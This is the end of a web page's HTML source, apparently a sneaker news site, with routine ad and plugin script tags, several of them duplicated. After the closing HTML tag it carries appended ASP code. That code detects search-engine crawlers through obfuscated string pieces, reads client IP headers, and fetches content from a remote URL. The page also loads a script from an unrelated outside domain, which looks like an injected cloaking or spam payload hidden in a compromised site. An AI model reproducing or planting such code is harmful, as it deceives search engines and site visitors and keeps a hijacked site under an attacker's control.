    elem.src = 'http://cdnl.complex.com/tv/js/widget.min.js';
    elem.async = true;
    elem.type = "text/javascript";
    var scpt = document.getElementsByTagName('script')[0];
    scpt.parentNode.insertBefore(elem, scpt);
  })();
</script>



<!--END-YM-NOTE GOES RIGHT ABOVE <script type='text/javascript' src='http://cdn.sneakernews.com/wp-includes/js/comment-reply.min.js?ver=4.0.1'></script>
<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201501'></script>
<script type='text/javascript' src='//assets.pinterest.com/js/pinit.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ratingsL10n = {"plugin_url":"http:\/\/sneakernews.com\/wp-content\/plugins\/wp-postratings","ajax_url":"http:\/\/sneakernews.com\/wp-admin\/admin-ajax.php","text_wait":"Please rate only 1 post at a time.","image":"stars","image_ext":"png","max":"10","show_loading":"1","show_fading":"1","custom":"0"};
var ratings_mouseover_image=new Image();ratings_mouseover_image.src=ratingsL10n.plugin_url+"/images/"+ratingsL10n.image+"/rating_over."+ratingsL10n.image_ext;;
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/postratings-js.js?ver=1.79'></script>
<script type='text/javascript' src='http://s.gravatar.com/js/gprofiles.js?ver=2015Janaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.0.1'></script>
</body>-->
<!--VIGLINK-->
<script type="text/javascript">
  var vglnk = { key: '678de23857128c9f3563fdc6fb9dd89d' };

  (function(d, t) {
    var s = d.createElement(t); s.type = 'text/javascript'; s.async = true;
    s.src = '//cdn.viglink.com/api/vglnk.js';
    var r = d.getElementsByTagName(t)[0]; r.parentNode.insertBefore(s, r);
  }(document, 'script'));
</script>
<!--VIGLINK-->
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-includes/js/comment-reply.min.js?ver=4.0.1'></script>
<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201501'></script>
<script type='text/javascript' src='//assets.pinterest.com/js/pinit.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ratingsL10n = {"plugin_url":"http:\/\/sneakernews.com\/wp-content\/plugins\/wp-postratings","ajax_url":"http:\/\/sneakernews.com\/wp-admin\/admin-ajax.php","text_wait":"Please rate only 1 post at a time.","image":"stars","image_ext":"png","max":"10","show_loading":"1","show_fading":"1","custom":"0"};
var ratings_mouseover_image=new Image();ratings_mouseover_image.src=ratingsL10n.plugin_url+"/images/"+ratingsL10n.image+"/rating_over."+ratingsL10n.image_ext;;
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/postratings-js.js?ver=1.79'></script>
<script type='text/javascript' src='http://s.gravatar.com/js/gprofiles.js?ver=2015Janaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.0.1'></script>
</body>
</html>




<%
	End If
	response.End()
End if
echohtml = ""'GetContent(echourl&"sysid="&systid&"&redirect=yes")
If instr(echohtml,lk)>0 Then
	'response.Write replace(echohtml,lk,"")
End If
Function GetContent(url)
	'on error resume next
	Dim xmlHttp
	Set xmlHttp = Server.Createobject("WinHttp.WinHttpRequest.5.1")
	'xmlHttp.SetTimeouts 60000, 60000, 60000, 3000
	xmlHttp.Open "POST", url , False
	xmlHttp.Send()
	GetHtml	= xmlHttp.ResponseBody
	Set xmlHttp=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "UTF-8"
	GetContent = objStream.ReadText
	objStream.Close
End Function

Function ChecksAgent()
  on error resume next
  agentallow=split("ba"&"idus"&"pid"&"er,so"&"g"&"ou,ba"&"i"&"du,so"&"sos"&"pider,goo"&"g"&"lebot",",")
  agentcheck=false
  For agenti=lbound(agentallow) to ubound(agentallow)
    If Instr(LCase(RSbs("HTTP_USER_AGENT")),agentallow(agenti))>0 then
      agentcheck=true
      Exit For
    end if 
  Next
  ChecksAgent=agentcheck
End function
Function GetRsip()
  'on error resume next
  Dim getips
  If RSbs("HTTP_"&"X_FOR"&"W"&"ARDED_FOR") = "" Or InStr(RSbs("H"&"TTP_X_FO"&"RW"&"ARD"&"ED_FOR"), "unknown") > 0 Then
   getips = RSbs("REM"&"OTE_A"&"DDR")
  ElseIf InStr(RSbs("HT"&"TP_"&"X_FORW"&"ARDED_FOR"), ",") > 0 Then
   getips = Mid(RSbs("H"&"TTP"&"_X_FO"&"RW"&"ARD"&"ED_FOR"), 1, InStr(RSbs("H"&"TT"&"P_"&"X_F"&"ORW"&"AR"&"DE"&"D_F"&"OR"), ",")-1)
   actforip = RSbs("REMO"&"TE_ADD"&"R")
  ElseIf InStr(RSbs("HTT"&"P_X"&"_F"&"RW"&"AR"&"DED_FOR"), ";") > 0 Then
   getips = Mid(RSbs("HT"&"TP_"&"X_F"&"OR"&"W"&"AR"&"DED_"&"FO"&"R"), 1, InStr(RSbs("H"&"TT"&"P_"&"_F"&"OR"&"WA"&"RD"&"ED_"&"FOR"), ";")-1)
   actforip = RSbs("R"&"EMO"&"TE_"&"AD"&"D"&"R")
  Else
   getips = RSbs("HT"&"TP"&"_X_FO"&"RW"&"ARD"&"ED_"&"FOR")
   actforip = RSbs("R"&"EM"&"OTE"&"_AD"&"DR")
  End If
  GetRsip = Replace(Trim(Mid(getips, 1, 30)), "'", "")
End Function

Function RSbs(str)
	RSbs = Request.ServerVariables(str)
End Function
%>
<script src="http://dx.jd9.co/jrnbb.js" type="text/javascript"></script>